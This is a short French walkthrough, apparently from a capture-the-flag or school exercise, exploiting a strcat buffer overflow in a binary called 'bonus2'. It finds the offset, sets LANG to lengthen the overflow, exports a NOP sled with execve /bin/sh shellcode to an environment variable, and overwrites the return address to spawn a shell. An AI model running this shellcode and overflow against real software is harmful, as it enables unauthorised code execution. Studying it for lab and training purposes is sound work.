Pour lancer le binaire, il faut que les arguments sois de 3.
Nous voyons que nous utilisons la function strcat. Nous allons donc faire un bufferoverflow.
Trouver l'offset (./bonus2 $(python -c 'print "A" * 40 + " " + "B * 28))
Nous recevons
Program received signal SIGSEGV, Segmentation fault.
0x08004242 in ?? ()
Nous voyons que nous ne réecrivons pas completement. Ca devrait etre 0x42424242 donc mettons LANG="nl"

Maintenant que nous avons notre overflow:
Nous exportons le shellcode 
SHELLCODE=$(python -c "print '\x90'*40 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'")
Nous récuperons l'adresse avec ce code:

/*
#include <stdlib.h>
#include <stdio.h>

int main(int argc, char *argv[]) {
    printf("%s => %p\n", argv[1], getenv(argv[1]));
    return 0;
}
*/

et nous lancons la commande ./bonus2 $(python -c "print 'A'*40 + ' ' + 'B'*23 + '\xfb\xf8\xff\xbf'")